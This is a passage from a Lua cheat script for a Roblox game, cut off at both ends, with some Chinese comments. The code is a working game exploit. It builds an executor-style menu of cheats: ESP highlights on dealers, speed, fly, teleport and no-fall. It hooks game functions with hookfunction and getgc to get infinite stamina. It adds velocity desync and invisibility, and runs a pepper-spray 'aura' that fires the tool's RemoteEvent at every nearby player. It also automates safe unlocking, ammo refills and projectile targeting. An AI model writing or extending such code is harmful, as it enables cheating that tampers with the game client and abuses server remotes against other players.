        while node and node ~= Workspace do
            if node:FindFirstChild("CurrentStocks") then
                return node
            end
            node = node.Parent
        end
        return nil
    end

    local function checkTEC9(shop)
        if not shop then return false, nil end

        local stocks = shop:FindFirstChild("CurrentStocks")
        if not stocks then return false, nil end

        local item = stocks:FindFirstChild(DealerESP.ItemName)
        if item then
            if item:IsA("ValueBase") then
                local v = item.Value
                if v == false or v == 0 or v == "" or v == nil then
                    return false, nil
                end
                if type(v) == "number" then
                    return true, tostring(v)
                end
            end
            return true, nil
        end

        local attr = stocks:GetAttribute(DealerESP.ItemName)
        if attr ~= nil then
            if attr == false or attr == 0 then return false, nil end
            return true, type(attr) == "number" and tostring(attr) or nil
        end

        return false, nil
    end

    -- 判断是否是 DealerMan 下的 Body Colors 对象
    -- 匹配路径: .../DealerMan["Body Colors"]
    local function isBodyColorsObject(obj)
        if obj.Name ~= "Body Colors" then return false end
        local parent = obj.Parent
        if not parent then return false end
        return parent.Name == DealerESP.TargetName
    end

    -- ================================================================
    -- DealerMan 模型同步（只处理 DealerMan 本体，不碰 Body Colors）
    -- ================================================================
    local function syncModel(model)
        local data = DealerESP.ByModel[model]
        if not data then return end

        if not model.Parent then
            if data.highlight then data.highlight:Destroy() end
            if data.billboard then data.billboard:Destroy() end
            DealerESP.ByModel[model] = nil
            return
        end

        local hasTEC9, qty = checkTEC9(findShop(model))

        -- ---------- Highlight ----------
        if DealerESP.Enabled then
            if not data.highlight then
                local h = Instance.new("Highlight")
                h.Name                = "DealerESP"
                h.Adornee             = model
                h.DepthMode           = Enum.HighlightDepthMode.AlwaysOnTop
                h.FillTransparency    = 0.5
                h.OutlineTransparency = 0
                h.Parent              = model
                data.highlight        = h
            end

            if hasTEC9 then
                data.highlight.FillColor    = Color3.fromRGB(0, 255, 90)
                data.highlight.OutlineColor = Color3.fromRGB(0, 255, 90)
            else
                data.highlight.FillColor    = Color3.fromRGB(255, 50, 50)
                data.highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            end
        else
            if data.highlight then
                data.highlight:Destroy()
                data.highlight = nil
            end
        end

        -- ---------- Billboard ----------
        if DealerESP.TEC9Show then
            if not data.billboard then
                local bb = Instance.new("BillboardGui")
                bb.Name           = "DealerESPInfo"
                bb.Adornee        = model
                bb.Size           = UDim2.new(0, 190, 0, 34)
                bb.AlwaysOnTop    = true
                bb.LightInfluence = 0
                bb.MaxDistance    = 900
                bb.ResetOnSpawn   = false
                bb.Parent         = model

                local lbl = Instance.new("TextLabel")
                lbl.Name                   = "Info"
                lbl.Size                   = UDim2.fromScale(1, 1)
                lbl.BackgroundTransparency = 1
                lbl.BorderSizePixel        = 0
                lbl.FontFace = SilkscreenFont
                lbl.TextScaled             = true
                lbl.TextWrapped            = false
                lbl.TextStrokeTransparency = 0.4
                lbl.TextColor3             = Color3.fromRGB(255, 255, 255)
                lbl.Text                   = "…"
                lbl.Parent                 = bb

                data.billboard = bb
                data.label     = lbl
            end

            if hasTEC9 then
                data.label.TextColor3 = Color3.fromRGB(0, 255, 90)
                data.label.Text       = qty and ("TEC-9 x" .. qty) or "TEC-9 on sale"
            else
                data.label.TextColor3 = Color3.fromRGB(255, 90, 90)
                data.label.Text       = "No TEC-9"
            end

            local ok, _, size = pcall(function()
                return model:GetBoundingBox()
            end)
            if ok and size then
                data.billboard.StudsOffsetWorldSpace = Vector3.new(0, size.Y / 2 + 2, 0)
            end
        else
            if data.billboard then
                data.billboard:Destroy()
                data.billboard = nil
                data.label     = nil
            end
        end
    end

    -- ================================================================
    -- Body Colors 对象同步（独立：金色 Highlight + 金色 "Body Colors"）
    -- ================================================================
    local function syncBodyColorItem(obj)
        local data = DealerESP.BodyColorItems[obj]
        if not data then return end

        if not obj.Parent then
            if data.highlight then data.highlight:Destroy() end
            if data.billboard then data.billboard:Destroy() end
            DealerESP.BodyColorItems[obj] = nil
            return
        end

        -- 开关关闭：清理
        if not DealerESP.BodyColorsEnabled then
            if data.highlight then data.highlight:Destroy(); data.highlight = nil end
            if data.billboard then data.billboard:Destroy(); data.billboard = nil; data.label = nil end
            return
        end

        -- ---------- 金色 Highlight ----------
        if not data.highlight then
            local h = Instance.new("Highlight")
            h.Name                = "BodyColorsESP"
            h.Adornee             = obj
            h.DepthMode           = Enum.HighlightDepthMode.AlwaysOnTop
            h.FillTransparency    = 0.5
            h.OutlineTransparency = 0
            h.Parent              = obj
            data.highlight        = h
        end
        data.highlight.FillColor    = DealerESP.Gold
        data.highlight.OutlineColor = DealerESP.Gold

        -- ---------- 金色 "Body Colors" 文字 ----------
        if not data.billboard then
            local bb = Instance.new("BillboardGui")
            bb.Name           = "BodyColorsInfo"
            bb.Adornee        = obj
            bb.Size           = UDim2.new(0, 190, 0, 34)
            bb.AlwaysOnTop    = true
            bb.LightInfluence = 0
            bb.MaxDistance    = 900
            bb.ResetOnSpawn   = false
            bb.Parent         = obj

            local lbl = Instance.new("TextLabel")
            lbl.Name                   = "Info"
            lbl.Size                   = UDim2.fromScale(1, 1)
            lbl.BackgroundTransparency = 1
            lbl.BorderSizePixel        = 0
            lbl.FontFace = SilkscreenFont
            lbl.TextScaled             = true
            lbl.TextWrapped            = false
            lbl.TextStrokeTransparency = 0.4
            lbl.TextColor3             = DealerESP.Gold
            lbl.Text                   = "Body Colors"
            lbl.Parent                 = bb

            data.billboard = bb
            data.label     = lbl
        end
        data.label.TextColor3 = DealerESP.Gold
        data.label.Text       = "Body Colors"

        -- 定位：Model 用 GetBoundingBox，BasePart 用 Size
        if obj:IsA("Model") then
            local ok, _, size = pcall(function() return obj:GetBoundingBox() end)
            if ok and size then
                data.billboard.StudsOffsetWorldSpace = Vector3.new(0, size.Y / 2 + 2, 0)
            end
        elseif obj:IsA("BasePart") then
            data.billboard.StudsOffsetWorldSpace = Vector3.new(0, obj.Size.Y / 2 + 2, 0)
        else
            data.billboard.StudsOffsetWorldSpace = Vector3.new(0, 3, 0)
        end
    end

    -- ================================================================
    -- 添加 / 扫描 / 刷新
    -- ================================================================
    local function addDealerModel(model)
        if not model:IsA("Model") then return end
        if model.Name ~= DealerESP.TargetName then return end
        if DealerESP.ByModel[model] then return end
        if LocalPlayer.Character and model:IsDescendantOf(LocalPlayer.Character) then return end

        DealerESP.ByModel[model] = {}

        model.Destroying:Connect(function()
            local data = DealerESP.ByModel[model]
            if data then
                if data.highlight then data.highlight:Destroy() end
                if data.billboard then data.billboard:Destroy() end
            end
            DealerESP.ByModel[model] = nil
        end)

        syncModel(model)
    end

    local function addBodyColorItem(obj)
        if DealerESP.BodyColorItems[obj] then return end
        if not isBodyColorsObject(obj) then return end

        DealerESP.BodyColorItems[obj] = {}

        obj.Destroying:Connect(function()
            local data = DealerESP.BodyColorItems[obj]
            if data then
                if data.highlight then data.highlight:Destroy() end
                if data.billboard then data.billboard:Destroy() end
            end
            DealerESP.BodyColorItems[obj] = nil
        end)

        syncBodyColorItem(obj)
    end

    local function scanDealers()
        local map = Workspace:FindFirstChild("Map")
        local shopz = map and map:FindFirstChild("Shopz")
        if not shopz then return end

        for _, desc in ipairs(shopz:GetDescendants()) do
            if desc.Name == DealerESP.TargetName and desc:IsA("Model") then
                addDealerModel(desc)
            elseif desc.Name == "Body Colors" then
                if isBodyColorsObject(desc) then
                    addBodyColorItem(desc)
                end
            end
        end
    end

    local function refreshAll()
        for model in pairs(DealerESP.ByModel) do
            pcall(syncModel, model)
        end
        for obj in pairs(DealerESP.BodyColorItems) do
            pcall(syncBodyColorItem, obj)
        end
    end

    -- 启动扫描 + 动态监听
    task.spawn(function()
        local map = Workspace:WaitForChild("Map", 30)
        if not map then return end
        local shopz = map:WaitForChild("Shopz", 30)
        if not shopz then return end

        scanDealers()

        shopz.DescendantAdded:Connect(function(desc)
            if desc.Name == DealerESP.TargetName and desc:IsA("Model") then
                addDealerModel(desc)
            elseif desc.Name == "Body Colors" then
                if isBodyColorsObject(desc) then
                    addBodyColorItem(desc)
                end
            end
        end)
    end)

    RunService.Heartbeat:Connect(function(dt)
        if not (DealerESP.Enabled or DealerESP.TEC9Show or DealerESP.BodyColorsEnabled) then return end
        DealerESP.Acc = DealerESP.Acc + dt
        if DealerESP.Acc < DealerESP.UpdateInterval then return end
        DealerESP.Acc = 0
        refreshAll()
    end)

    -- ================================================================
    -- UI
    -- ================================================================
    local sec = Sub:Section({Name = "DealerMan", Side = 2})

    sec:Toggle({
        Name    = "DealerMan ESP",
        Flag    = "CAT_Dealer_ESP",
        Default = false,
        Callback = function(v)
            DealerESP.Enabled = v
            if v then scanDealers() end
            refreshAll()
        end
    }):Keybind({
        Flag = "CAT_Dealer_ESP_KB",
        Mode = "Toggle",
        Callback = function(v)
            if Library and Library.SetFlags and Library.SetFlags["CAT_Dealer_ESP"] then
                Library.SetFlags["CAT_Dealer_ESP"](v)
            end
        end
    })

    sec:Toggle({
        Name    = "TEC-9 Display",
        Flag    = "CAT_Dealer_TEC9",
        Default = false,
        Callback = function(v)
            DealerESP.TEC9Show = v
            if v then scanDealers() end
            refreshAll()
        end
    }):Keybind({
        Flag = "CAT_Dealer_TEC9_KB",
        Mode = "Toggle",
        Callback = function(v)
            if Library and Library.SetFlags and Library.SetFlags["CAT_Dealer_TEC9"] then
                Library.SetFlags["CAT_Dealer_TEC9"](v)
            end
        end
    })

    sec:Toggle({
        Name    = "Body Colors ESP",
        Flag    = "CAT_Dealer_BodyColors",
        Default = false,
        Callback = function(v)
            DealerESP.BodyColorsEnabled = v
            if v then scanDealers() end
            refreshAll()
        end
    }):Keybind({
        Flag = "CAT_Dealer_BodyColors_KB",
        Mode = "Toggle",
        Callback = function(v)
            if Library and Library.SetFlags and Library.SetFlags["CAT_Dealer_BodyColors"] then
                Library.SetFlags["CAT_Dealer_BodyColors"](v)
            end
        end
    })
end
end

do -- Player page
    local Page = Window:Page({Name="Player", SubPages=true})
    local Sub  = Page:SubPage({Name="Physical", Columns=2})
    local sec  = Sub:Section({Name="Movement", Side=1})
    sec:Toggle({Name="WalkSpeed", Flag="CAT_WalkSpeed_53", Callback=function(v) SpeedState=v end}):Keybind({Flag="CAT_WalkSpeed_53_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_WalkSpeed_53"] then Library.SetFlags["CAT_WalkSpeed_53"](v) end end})
    sec:Slider( {Name="Value", Flag="CAT_Value_54", Min=1, Max=100, Default=33.5, Decimals=0.1, Callback=function(v) SpeedValue=v end})
    sec:Toggle({Name="JumpPower", Flag="CAT_JumpPower_55", Callback=function(v) JumpState=v end}):Keybind({Flag="CAT_JumpPower_55_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_JumpPower_55"] then Library.SetFlags["CAT_JumpPower_55"](v) end end})
    sec:Slider( {Name="Value", Flag="CAT_Value_56", Min=1, Max=100, Default=73,   Decimals=0.1, Callback=function(v) JumpValue=v end})
    sec:Toggle({Name="No fall", Flag="CAT_No_fall_57", Default=false, Callback=function(v) NoFallEnabled=v end}):Keybind({Flag="CAT_No_fall_57_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_No_fall_57"] then Library.SetFlags["CAT_No_fall_57"](v) end end})
    sec:Toggle({Name="Fly", Flag="CAT_PL_Fly", Callback=function(v)
        FLY.Enabled = v
        if FLY.MobileMode then
            -- 手机模式：和原来一样，有GUI
            if v then
                FlyCreateUI()
                FlyOn()
            else
                FlyOff()
                FlyDestroyUI()
            end
        else
            -- 普通模式：直接飞，无任何GUI
            if v then
                FlyOn()
            else
                FlyOff()
            end
        end
    end}):Keybind({Flag="CAT_PL_Fly_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_PL_Fly"] then Library.SetFlags["CAT_PL_Fly"](v) end end})
    sec:Dropdown({
        Name="Fly Type",
        Flag="CAT_Fly_Type_58",
        Items={"Normal Fly","Torso Fly"},
        Default="Normal Fly",
        Callback=function(v)
            local wasActive = FLY.Active
            if wasActive then FlyOff() end
            FLY.Mode = v
            if wasActive then FlyOn() end
        end
    })
    sec:Slider({Name="Fly speed", Flag="CAT_Fly_speed_58", Min=1, Max=100, Default=60, Callback=function(v)
        FLY.Speed=v
        if FLY.SpeedLabel then FLY.SpeedLabel.Text="spd  "..v end
    end})
    sec:Toggle({Name="Mobile mode", Flag="CAT_PL_MobileMode", Default=false, Callback=function(v)
        FLY.MobileMode = v
    end}):Keybind({Flag="CAT_PL_MobileMode_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_PL_MobileMode"] then Library.SetFlags["CAT_PL_MobileMode"](v) end end})
    sec:Toggle({
    Name="Auto buy bandage",
    Flag="CAT_PL_AutoBandage",
    Default=false,
    Callback=function(v)
        BANDAGE.Enabled = v
        if v then
            StartAutoBandage()
        end
    end
}):Keybind({
    Flag="CAT_PL_AutoBandage_KB", Mode="Toggle",
    Callback=function(v)
        if Library and Library.SetFlags and Library.SetFlags["CAT_PL_AutoBandage"] then
            Library.SetFlags["CAT_PL_AutoBandage"](v)
        end
    end
})
    sec:Toggle({Name="Infinite Stamina", Flag="CAT_PL_InfStamina", Default=false, Callback=function(Value)
        InfStaminaEnabled=Value
        if InfStaminaConnection then InfStaminaConnection:Disconnect(); InfStaminaConnection=nil end
        if Value then
            local ok=pcall(function()
                local tgt=getupvalue(getrenv()._G.S_Take,2); local old
                old=hookfunction(tgt,function(v1,...) if InfStaminaEnabled then v1=0 end return old(v1,...) end)
            end)
            if not ok then
                local tbs={}
                local function collect() tbs={}; for _,v in pairs(getgc(true)) do if type(v)=="table" and rawget(v,"S") then tbs[#tbs+1]=v end end end
                pcall(collect)
                InfStaminaConnection=RunService.RenderStepped:Connect(function()
                    if InfStaminaEnabled then
                        if tick()%5<0.1 then pcall(collect) end
                        for _,t in ipairs(tbs) do pcall(function() t.S=100 end) end
                        local c=LocalPlayer.Character; local h=c and c:FindFirstChildOfClass("Humanoid")
                        if h then h:SetAttribute("ZSPRN_M",true) end
                    end
                end)
            end
        else
            local c=LocalPlayer.Character; local h=c and c:FindFirstChildOfClass("Humanoid")
            if h then h:SetAttribute("ZSPRN_M",nil) end
        end
    end}):Keybind({Flag="CAT_PL_InfStamina_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_PL_InfStamina"] then Library.SetFlags["CAT_PL_InfStamina"](v) end end})
end

do -- Teleport page
    local Page = Window:Page({Name="Teleport", SubPages=false})
    local sec = Page:Section({Name="Teleport", Side=1})

    sec:Toggle({Name="Enable Teleport", Flag="CAT_TP_Enable_73", Default=false, Callback=function(v)
        TP.Enabled = v
        if v then
            StartTeleportLoop()
        end
    end}):Keybind({Flag="CAT_TP_Enable_73_KB", Mode="Toggle", Callback=function(v)
        if Library and Library.SetFlags and Library.SetFlags["CAT_TP_Enable_73"] then
            Library.SetFlags["CAT_TP_Enable_73"](v)
        end
    end})

    sec:Slider({Name="Rate (seconds)", Flag="CAT_Teleport_Rate_74", Min=0.01, Max=2, Default=0.01, Decimals=0.01, Callback=function(v)
        TP.Rate = math.max(0.01, v)
    end})

    sec:Toggle({Name="FF check", Flag="CAT_TP_FFCheck_75", Default=false, Callback=function(v)
        TP.FFCheck = v
    end})

    sec:Toggle({Name="Detecting life", Flag="CAT_TP_DetectLife_76", Default=true, Callback=function(v)
        TP.DetectingLife = v
    end})

    sec:Label("Targets: PlayerList > Priority")
end

do -- Antis page
    local Page        = Window:Page({Name="Antis", SubPages=false})
    local AntiHitSec  = Page:Section({Name="Anti hit", Side=1})

    AntiHitSec:Dropdown({Name="Head mode", Flag="CAT_Head_mode_59", Items={"Hide head","Yaw head","Custom"}, Callback=function(v)
        if not v and OriginalNeckC0 then
            local ch = LocalPlayer.Character
            if ch then
                local hd = ch:FindFirstChild("Head")
                local ts = ch:FindFirstChild("UpperTorso") or ch:FindFirstChild("Torso")
                local nk = (hd and hd:FindFirstChild("Neck")) or (ts and ts:FindFirstChild("Neck"))
                if nk then nk.C0 = OriginalNeckC0; nk.C1 = OriginalNeckC1 end
            end
            OriginalNeckC0, OriginalNeckC1 = nil, nil
        end
        HeadYawTime = 0
        HeadMode = v
    end})
    AntiHitSec:Slider({Name="Custom yaw", Flag="CAT_Custom_yaw_60",     Min=-90, Max=90, Default=30,  Decimals=0.1, Callback=function(v) HeadYaw=v; HeadCustomYaw=v end})
    AntiHitSec:Slider({Name="Rotation speed", Flag="CAT_Rotation_speed_61", Min=-50,  Max=50,  Default=30,  Decimals=0.1, Callback=function(v) HeadRotSpeed=v end})

    AntiHitSec:Dropdown({Name="Hands mod", Flag="CAT_Hands_mod_62", Items={"Hands up","Open hands"}, Callback=function(v) HandsModSelection=v end})

    AntiHitSec:Toggle({Name="乱飞", Flag="CAT_AN_LuanFei", Callback=function(v)
        LF.Enabled = v
        if not v then
            if LF.Track1 then pcall(function() LF.Track1:Stop(0) end); LF.Track1 = nil end
            if LF.Track2 then pcall(function() LF.Track2:Stop(0) end); LF.Track2 = nil end
            LF.Angle = 0
        end
    end}):Keybind({Flag="CAT_AN_LuanFei_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_AN_LuanFei"] then Library.SetFlags["CAT_AN_LuanFei"](v) end end})

    -- Invisible toggle
    AntiHitSec:Toggle({Name="Invisible", Flag="CAT_AN_Invisible", Callback=function(v)
        Invis_Enabled=v
        if not v then
            if Invis_Track then pcall(function() Invis_Track:Stop() end); Invis_Track=nil end
            local char=LocalPlayer.Character
            if char then
                for _,p in ipairs(char:GetChildren()) do
                    if p:IsA("BasePart") and p.Transparency==0.5 then p.Transparency=0 end
                end
            end
        end
    end}):Keybind({Flag="CAT_AN_Invisible_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_AN_Invisible"] then Library.SetFlags["CAT_AN_Invisible"](v) end end})

    do -- Desync
        local sec=Page:Section({Name="Velocity desync", Side=2})
        sec:Toggle({Name="Enable", Flag="CAT_Enable_63",    Callback=function(v) DS.Enabled=v end}):Keybind({Flag="CAT_Enable_63_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Enable_63"] then Library.SetFlags["CAT_Enable_63"](v) end end})
        sec:Toggle({Name="Visualize", Flag="CAT_Visualize_64", Default=true, Callback=function(v) DS.Visualize=v end}):Keybind({Flag="CAT_Visualize_64_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Visualize_64"] then Library.SetFlags["CAT_Visualize_64"](v) end end})
        sec:Slider({Name="TP Rate", Flag="CAT_TP_Rate_65",  Min=1,  Max=100, Default=60,  Callback=function(v) DS.TPRate=v end})
        sec:Slider({Name="X Offset", Flag="CAT_X_Offset_66", Min=1,  Max=20,  Default=8.5, Decimals=0.1, Callback=function(v) DS.X=v end})
        sec:Slider({Name="Y Offset", Flag="CAT_Y_Offset_67", Min=1,  Max=20,  Default=3,   Decimals=0.1, Callback=function(v) DS.Y=v end})
        sec:Slider({Name="Z Offset", Flag="CAT_Z_Offset_68", Min=1,  Max=20,  Default=8.5, Decimals=0.1, Callback=function(v) DS.Z=v end})
    end
end

do -- Misc page
    local Page = Window:Page({Name="Misc", SubPages=false})
    
    local sL   = Page:Section({Name="Shiftlock", Side=1})
    sL:Toggle({Name="Anti auto shiftlock", Flag="CAT_Anti_auto_shiftlock_69", Callback=function(v) MC.AntiShift=v end}):Keybind({Flag="CAT_Anti_auto_shiftlock_69_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Anti_auto_shiftlock_69"] then Library.SetFlags["CAT_Anti_auto_shiftlock_69"](v) end end})
    sL:Slider( {Name="Delay", Flag="CAT_Delay_70", Min=0.01, Max=0.50, Default=0.05, Decimals=0.01, Callback=function(v) MC.ShiftDelay=v end})
    
    local sFarm = Page:Section({Name="Farm", Side=1})
    sFarm:Toggle({Name="Auto pick up money", Flag="CAT_MC_AutoPickup", Callback=function(v) 
        SC.APM_Enabled = v 
        if v then StartAutoPickUpMoney() end
    end}):Keybind({Flag="CAT_MC_AutoPickup_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_MC_AutoPickup"] then Library.SetFlags["CAT_MC_AutoPickup"](v) end end})
    sFarm:Toggle({Name="Auto unlock safe", Flag="CAT_MC_AutoUnlock", Callback=function(v)
        SC.AUS_Enabled = v
        if v then StartAutoUnlockSafe() end
    end}):Keybind({Flag="CAT_MC_AutoUnlock_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_MC_AutoUnlock"] then Library.SetFlags["CAT_MC_AutoUnlock"](v) end end})
    -- ============================================================
-- == Pepper Spray (无限辣椒喷雾 + 辣椒喷雾 Aura)
-- ============================================================
local Pepper = {
    InfiniteEnabled = false,
    AuraEnabled     = false,
    IgnoreDead      = true,
    AuraRange       = 25,
    FireInterval    = 0.1,
    AuraThread      = nil,
    RefillThread    = nil,
}

local function Pepper_Refill()
    local char = LocalPlayer.Character
    if not char then return end
    local pepperTool = char:FindFirstChild("Pepper-spray")
    if not pepperTool then return end
    local ammo = pepperTool:FindFirstChild("Ammo")
    if ammo then
        ammo.MinValue = 100
        ammo.Value    = 100
    end
end

local function Pepper_StartRefill()
    if Pepper.RefillThread then return end
    Pepper.RefillThread = task.spawn(function()
        while Pepper.InfiniteEnabled do
            Pepper_Refill()
            task.wait(0.2)
        end
        Pepper.RefillThread = nil
    end)
end

local function Pepper_IsAlive(character)
    if not character then return false end
    local hum = character:FindFirstChildOfClass("Humanoid")
    return hum ~= nil and hum.Health > 0
end

local function Pepper_AuraLoop()
    local lastFire = 0
    while Pepper.AuraEnabled do
        local now = os.clock()
        if now - lastFire < Pepper.FireInterval then
            RunService.Heartbeat:Wait()
            continue
        end
        lastFire = now

        local char = LocalPlayer.Character
        if Pepper_IsAlive(char) then
            local root       = char:FindFirstChild("HumanoidRootPart")
            local pepperTool = char:FindFirstChild("Pepper-spray")
            local remote     = pepperTool and pepperTool:FindFirstChild("RemoteEvent")

            if root and remote then
                local myPos   = root.Position
                local anyHit  = false
                local rangeSqr = Pepper.AuraRange * Pepper.AuraRange

                for _, v in ipairs(Players:GetPlayers()) do
                    if v ~= LocalPlayer then
                        local vChar = v.Character
                        local vRoot = vChar and vChar:FindFirstChild("HumanoidRootPart")

                        local ok = vRoot ~= nil
                        if ok and Pepper.IgnoreDead then
                            ok = Pepper_IsAlive(vChar)
                        end
                        if ok and table.find(WhiteList, v.Name) then
                            ok = false
                        end

                        if ok then
                            local d = vRoot.Position - myPos
                            if d.X*d.X + d.Y*d.Y + d.Z*d.Z < rangeSqr then
                                pcall(function()
                                    remote:FireServer("Spray", true)
                                    remote:FireServer("Hit", vChar)
                                end)
                                anyHit = true
                            end
                        end
                    end
                end

                if not anyHit then
                    pcall(function()
                        remote:FireServer("Spray", false)
                    end)
                end
            end
        end

        RunService.Heartbeat:Wait()
    end
    Pepper.AuraThread = nil
end

local function Pepper_StartAura()
    if Pepper.AuraThread and coroutine.status(Pepper.AuraThread) ~= "dead" then return end
    Pepper.AuraThread = task.spawn(Pepper_AuraLoop)
end

local sPepper = Page:Section({Name="Pepper Spray", Side=2})

sPepper:Toggle({
    Name="Infinite Pepper Spray",
    Flag="CAT_Pepper_Infinite",
    Default=false,
    Callback=function(v)
        Pepper.InfiniteEnabled = v
        if v then Pepper_StartRefill() end
    end
}):Keybind({Flag="CAT_Pepper_Infinite_KB", Mode="Toggle", Callback=function(v)
    if Library and Library.SetFlags and Library.SetFlags["CAT_Pepper_Infinite"] then
        Library.SetFlags["CAT_Pepper_Infinite"](v)
    end
end})

sPepper:Toggle({
    Name="Pepper Spray Aura",
    Flag="CAT_Pepper_Aura",
    Default=false,
    Callback=function(v)
        Pepper.AuraEnabled = v
        if v then Pepper_StartAura() end
    end
}):Keybind({Flag="CAT_Pepper_Aura_KB", Mode="Toggle", Callback=function(v)
    if Library and Library.SetFlags and Library.SetFlags["CAT_Pepper_Aura"] then
        Library.SetFlags["CAT_Pepper_Aura"](v)
    end
end})

sPepper:Toggle({
    Name="Ignore Dead",
    Flag="CAT_Pepper_IgnoreDead",
    Default=true,
    Callback=function(v) Pepper.IgnoreDead = v end
}):Keybind({Flag="CAT_Pepper_IgnoreDead_KB", Mode="Toggle", Callback=function(v)
    if Library and Library.SetFlags and Library.SetFlags["CAT_Pepper_IgnoreDead"] then
        Library.SetFlags["CAT_Pepper_IgnoreDead"](v)
    end
end})

sPepper:Slider({
    Name="Aura Range",
    Flag="CAT_Pepper_Range",
    Min=5, Max=50, Default=25,
    Callback=function(v) Pepper.AuraRange = v end
})

    local sR = Page:Section({Name="Camera", Side=2})
    sR:Toggle({Name="Smooth Camera", Flag="CAT_Smooth_Camera_71", Callback=function(v) MC.SmoothCam=v; if not v then MC.SmoothPos=nil end end}):Keybind({Flag="CAT_Smooth_Camera_71_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Smooth_Camera_71"] then Library.SetFlags["CAT_Smooth_Camera_71"](v) end end})
    sR:Slider( {Name="Speed", Flag="CAT_Speed_72", Min=1, Max=10, Default=6, Callback=function(v) MC.LerpSpeed=v end})
end

do -- PlayerList page
    local Page = Window:Page({Name="PlayerList", SubPages=false})
    local pL   = Page:Section({Name="Target List", Side=1})
    PL_TargetSearch = pL:Searchbox({Name="Targets", Items=GetAllPlayerNames(), Multi=true,
        Callback=function(v)
            TargetList = (typeof(v)=="table" and v or {v})
            if espSets.enabled and espSets.targetOnly then refreshAllESP() end
            SavePlayerLists()
        end})
    pL:Button({Name="Clear Targets", Callback=function()
        TargetList={}
        pcall(function() PL_TargetSearch:Set({}) end)
        if espSets.enabled and espSets.targetOnly then refreshAllESP() end
        SavePlayerLists()
    end})
    local pR = Page:Section({Name="Whitelist", Side=2})
    PL_WhiteSearch = pR:Searchbox({Name="Whitelist", Items=GetAllPlayerNames(), Multi=true,
        Callback=function(v)
            WhiteList = (typeof(v)=="table" and v or {v})
            SavePlayerLists()
        end})
    pR:Button({Name="Clear Whitelist", Callback=function()
        WhiteList={}
        pcall(function() PL_WhiteSearch:Set({}) end)
        SavePlayerLists()
    end})

    -- 启动后把已保存的列表同步回 UI（只对当前在线的玩家显示勾选）
    task.defer(function()
        task.wait(0.15)
        if #TargetList > 0 then
            pcall(function() PL_TargetSearch:Set(TargetList) end)
        end
        if #WhiteList > 0 then
            pcall(function() PL_WhiteSearch:Set(WhiteList) end)
        end
    end)
end

do -- Projectile page (C4 fly + Bullet fly)
    local Page = Window:Page({Name = "Projectile", SubPages = false})

    -- ================================================================
    -- State
    -- ================================================================
    local CFly = {
        C4Enabled        = false,
        C4Speed          = 120,
        RocketEnabled    = false,
        RocketSpeed      = 200,
        SpecificTarget   = "",
        SafeWallDistance = 0.8,
        NarrowSpaceMode  = true,
        UseBlacklist     = false,   -- 使用 PlayerList 的 WhiteList 作黑名单
        Break            = false,
    }

    local RealDebris = Debris
    local WSDebris   = workspace:WaitForChild("Debris", 60)
    local VParts     = WSDebris and WSDebris:WaitForChild("VParts", 60)

    -- 说明：黑名单/白名单直接复用 PlayerList 页面维护的
    --   WhiteList  = PlayerList 的「Whitelist」  → 当作黑名单用（排除）
    --   TargetList = PlayerList 的「Target List」→ 当作白名单用（只瞄名单里的）

    -- ================================================================
    -- 目标选择
    -- 优先级：输入 ID > 黑名单(可选) > TargetList 白名单(非空时生效) > 自动选最近
    -- ================================================================
    
-- ================================================================
-- 目标选择
-- 优先级：
--   ① 输入 ID 非空         → 只打这个玩家
--   ② 黑名单(TargetList)非空 → 只打黑名单里的玩家（排除白名单）
--   ③ 都为空              → 打非白名单里最近的目标
-- 白名单(WhiteList) 永远保护，任何情况下都不攻击
-- ================================================================
local function CF_GetTarget()
    -- ① 输入框有名字，优先打这个名字（无视白名单/黑名单）
    if CFly.SpecificTarget ~= "" then
        local found = Players:FindFirstChild(CFly.SpecificTarget)
        if found and found.Character and found.Character:FindFirstChild("HumanoidRootPart") then
            local hum = found.Character:FindFirstChildOfClass("Humanoid")
            local ff  = found.Character:FindFirstChildOfClass("ForceField")
            if hum and hum.Health > 0 and not ff then
                return found.Character
            end
        end
    end

    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not myRoot then return nil end

    local hasBlacklist = #TargetList > 0
    local nearestChar, shortestDist = nil, math.huge

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            local skip = false

            -- 白名单：永远保护
            if table.find(WhiteList, p.Name) then
                skip = true
            end

            -- ② 黑名单非空时：只打黑名单里的玩家
            if not skip and hasBlacklist and not table.find(TargetList, p.Name) then
                skip = true
            end

            if not skip and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                local hum = p.Character:FindFirstChildOfClass("Humanoid")
                local ff  = p.Character:FindFirstChildOfClass("ForceField")
                if hum and hum.Health > 0 and not ff then
                    local dist = (myRoot.Position - p.Character.HumanoidRootPart.Position).Magnitude
                    if dist < shortestDist then
                        shortestDist = dist
                        nearestChar = p.Character
                    end
                end
            end
        end
    end

    return nearestChar
end

    -- ================================================================
    -- Helpers
    -- ================================================================
    local function CF_CreateTrail(startPos, endPos)
        pcall(function()
            local part = Instance.new("Part")
            part.Anchored     = true
            part.CanCollide   = false
            part.Transparency = 0.3
            part.Material     = Enum.Material.Neon
            part.Color        = Color3.fromRGB(0, 255, 150)

            local distance = (startPos - endPos).Magnitude
            part.Size   = Vector3.new(0.2, 0.2, distance)
            part.CFrame = CFrame.new(startPos, endPos) * CFrame.new(0, 0, -distance / 2)
            part.Parent = workspace

            RealDebris:AddItem(part, 2.0)
